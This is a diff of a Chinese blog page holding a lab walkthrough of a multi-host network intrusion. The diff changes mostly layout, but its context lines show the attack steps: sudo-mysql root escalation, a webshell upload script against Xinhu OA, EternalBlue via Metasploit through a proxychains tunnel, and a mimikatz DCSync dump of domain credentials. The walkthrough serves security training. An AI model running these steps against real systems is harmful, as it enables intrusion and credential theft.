@@ -59,14 +59,14 @@
         <div class="post-tags"><a href="/tags/?tag=%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C">#春秋云镜</a><a href="/tags/?tag=thinkphp%205.0.23%20RCE">#thinkphp 5.0.23 RCE</a><a href="/tags/?tag=mysql%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83">#mysql命令提权</a><a href="/tags/?tag=%E4%BF%A1%E5%91%BCnday">#信呼nday</a><a href="/tags/?tag=ms17-010(%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D)">#ms17-010(永恒之蓝)</a><a href="/tags/?tag=DCSyn">#DCSyn</a></div>
       </header>
       <div class="post-layout section-shell">
-        <article class="article-content" data-article-content><h1 id="信息搜集">信息搜集<a class="heading-anchor" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86" aria-label="链接到 信息搜集">#</a></h1><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417134440430.png" alt="image-20250417134440430" loading="lazy" decoding="async"></figure></p>
-<h1 id="thinkphp-5023-rce">thinkphp 5.0.23 RCE<a class="heading-anchor" href="#thinkphp-5023-rce" aria-label="链接到 thinkphp 5.0.23 RCE">#</a></h1><p>检测一下</p>
-<p><figure class="article-image"><img src="/assets/post-media/327fc326/image-20250417134357989.png" alt="image-20250417134357989" loading="lazy" decoding="async"></figure></p>
+        <article class="article-content" data-article-content><h2 id="信息搜集">信息搜集<a class="heading-anchor" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86" aria-label="链接到 信息搜集">#</a></h2><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1267 / 556;--image-max-width:1732px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417134440430.png" alt="image-20250417134440430" loading="lazy" decoding="async" width="1267" height="556"></span></figure></p>
+<h2 id="thinkphp-5023-rce">thinkphp 5.0.23 RCE<a class="heading-anchor" href="#thinkphp-5023-rce" aria-label="链接到 thinkphp 5.0.23 RCE">#</a></h2><p>检测一下</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:980 / 700;--image-max-width:1064px"><img data-article-image src="/assets/post-media/327fc326/image-20250417134357989.png" alt="image-20250417134357989" loading="lazy" decoding="async" width="980" height="700"></span></figure></p>
 <p>写马</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417134813100.png" alt="image-20250417134813100" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:982 / 732;--image-max-width:1020px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417134813100.png" alt="image-20250417134813100" loading="lazy" decoding="async" width="982" height="732"></span></figure></p>
 <p>反弹shell</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417135222247.png" alt="image-20250417135222247" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417135216215.png" alt="image-20250417135216215" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:937 / 595;--image-max-width:1197px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417135222247.png" alt="image-20250417135222247" loading="lazy" decoding="async" width="937" height="595"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1470 / 1155;--image-max-width:967px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417135216215.png" alt="image-20250417135216215" loading="lazy" decoding="async" width="1470" height="1155"></span></figure></p>
 <p>得到第一半flag</p>
 <figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">www-data@ubuntu-web01:/$ <span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! cat /root/flag/f*&#x27;</span>
 <span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! cat /root/flag/f*&#x27;</span>
@@ -197,7 +197,7 @@ www-data@ubuntu-web01:/tmp$ ./fscan -h 172.22.1.15/24
         links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
 [2025-04-17 13:55:50] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统</span></code></pre></figure><figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">172.22.1.2   DC 
 172.22.1.21  MS17-010 
-172.22.1.18  信呼OA</code></pre></figure><h1 id="17222118-信呼nday">172.22.1.18-信呼nday<a class="heading-anchor" href="#17222118-%E4%BF%A1%E5%91%BCnday" aria-label="链接到 172.22.1.18-信呼nday">#</a></h1><p>frps.ini</p>
+172.22.1.18  信呼OA</code></pre></figure><h2 id="17222118-信呼nday">172.22.1.18-信呼nday<a class="heading-anchor" href="#17222118-%E4%BF%A1%E5%91%BCnday" aria-label="链接到 172.22.1.18-信呼nday">#</a></h2><p>frps.ini</p>
 <figure class="code-block"><figcaption><span>ini</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-ini"><span class="hljs-section">[common]</span>
 <span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>
 <span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>
@@ -215,10 +215,10 @@ www-data@ubuntu-web01:/tmp$ ./fscan -h 172.22.1.15/24
 <span class="hljs-attr">remote_port</span> =<span class="hljs-number">8886</span>
 <span class="hljs-attr">plugin</span> = socks5
 <span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span>
-<span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span></code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417142801800.png" alt="image-20250417142801800" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417142750373.png" alt="image-20250417142750373" loading="lazy" decoding="async"></figure></p>
+<span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span></code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:447 / 289;--image-max-width:1176px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417142801800.png" alt="image-20250417142801800" loading="lazy" decoding="async" width="447" height="289"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:713 / 425;--image-max-width:1275px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417142750373.png" alt="image-20250417142750373" loading="lazy" decoding="async" width="713" height="425"></span></figure></p>
 <p>访问到</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417141600516.png" alt="image-20250417141600516" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1448;--image-max-width:1339px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417141600516.png" alt="image-20250417141600516" loading="lazy" decoding="async" width="2552" height="1448"></span></figure></p>
 <p>admin/admin123登录</p>
 <figure class="code-block"><figcaption><span>python</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-python"><span class="hljs-keyword">import</span> requests
 
@@ -261,9 +261,9 @@ r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&
 &lt;b&gt;Notice&lt;/b&gt;:  Undefined offset: 1 in &lt;b&gt;C:\phpStudy\PHPTutorial\WWW\upload\2025-04\17_14190460.php&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;
 
 
-进程已结束，退出代码为 0</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417141950841.png" alt="image-20250417141950841" loading="lazy" decoding="async"></figure></p>
+进程已结束，退出代码为 0</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1024 / 640;--image-max-width:1216px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417141950841.png" alt="image-20250417141950841" loading="lazy" decoding="async" width="1024" height="640"></span></figure></p>
 <p>拿到flag2</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417142042431.png" alt="image-20250417142042431" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1026 / 692;--image-max-width:1127px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417142042431.png" alt="image-20250417142042431" loading="lazy" decoding="async" width="1026" height="692"></span></figure></p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text"> ___    ___ ___  ________  ________  ________  ________  ________   ________     
 |\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    
 \ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    
@@ -276,15 +276,15 @@ r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&
 
 flag02: 2ce3-4813-87d4-
 
-Awesome! ! ! You found the second flag, now you can attack the domain controller.</code></pre></figure><h1 id="17222121-永恒之蓝">172.22.1.21-永恒之蓝<a class="heading-anchor" href="#17222121-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D" aria-label="链接到 172.22.1.21-永恒之蓝">#</a></h1><p>接下来打下一个，首先kali配置proxychains</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417144001455.png" alt="image-20250417144001455" loading="lazy" decoding="async"></figure></p>
+Awesome! ! ! You found the second flag, now you can attack the domain controller.</code></pre></figure><h2 id="17222121-永恒之蓝">172.22.1.21-永恒之蓝<a class="heading-anchor" href="#17222121-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D" aria-label="链接到 172.22.1.21-永恒之蓝">#</a></h2><p>接下来打下一个，首先kali配置proxychains</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:547 / 237;--image-max-width:1754px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417144001455.png" alt="image-20250417144001455" loading="lazy" decoding="async" width="547" height="237"></span></figure></p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">proxychains msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp
 show options 
 set rhosts 172.22.1.21
-run</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417143924503.png" alt="image-20250417143924503" loading="lazy" decoding="async"></figure></p>
-<h1 id="1722212-横向">172.22.1.2-横向<a class="heading-anchor" href="#1722212-%E6%A8%AA%E5%90%91" aria-label="链接到 172.22.1.2-横向">#</a></h1><figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">load kiwi
+run</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1240 / 740;--image-max-width:1274px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417143924503.png" alt="image-20250417143924503" loading="lazy" decoding="async" width="1240" height="740"></span></figure></p>
+<h2 id="1722212-横向">172.22.1.2-横向<a class="heading-anchor" href="#1722212-%E6%A8%AA%E5%90%91" aria-label="链接到 172.22.1.2-横向">#</a></h2><figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">load kiwi
 kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</code></pre></figure><figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">meterpreter &gt; load kiwi
 [proxychains] DLL init: proxychains-ng <span class="hljs-number">4</span>.<span class="hljs-number">17</span>
 [proxychains] DLL init: proxychains-ng <span class="hljs-number">4</span>.<span class="hljs-number">17</span>
@@ -363,9 +363,9 @@ SMB         172.22.1.2      445    DC01
 SMB         172.22.1.2      445    DC01             
 SMB         172.22.1.2      445    DC01             flag03: e8f88d0d43d6}
 SMB         172.22.1.2      445    DC01             
-SMB         172.22.1.2      445    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417144426501.png" alt="image-20250417144426501" loading="lazy" decoding="async"></figure></p>
+SMB         172.22.1.2      445    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1552 / 569;--image-max-width:2073px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250417144426501.png" alt="image-20250417144426501" loading="lazy" decoding="async" width="1552" height="569"></span></figure></p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</code></pre></figure></article>
-        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">信息搜集</a><a class="toc-depth-2" href="#thinkphp-5023-rce">thinkphp 5.0.23 RCE</a><a class="toc-depth-2" href="#17222118-%E4%BF%A1%E5%91%BCnday">172.22.1.18-信呼nday</a><a class="toc-depth-2" href="#17222121-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D">172.22.1.21-永恒之蓝</a><a class="toc-depth-2" href="#1722212-%E6%A8%AA%E5%90%91">172.22.1.2-横向</a></div></nav></aside>
       </div>
       <div class="post-tools section-shell">
         <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
@@ -380,7 +380,7 @@ SMB         172.22.1.2      445    DC01             Unbelievable! ! You found th
     <a href="/posts/8cc5a836.html"><span>2026/02/11</span><strong>HMVM-MS02423</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
     <a href="/posts/3d3db288.html"><span>2026/02/10</span><strong>HMVM-Coolpg</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
     </main>
-    
+    <button class="floating-toc-button" type="button" data-toc-toggle aria-label="打开目录" data-tooltip="目录"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg></button>
     
     <footer class="site-footer">
       <div class="footer-lead">
@@ -400,26 +400,26 @@ SMB         172.22.1.2      445    DC01             Unbelievable! ! You found th
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
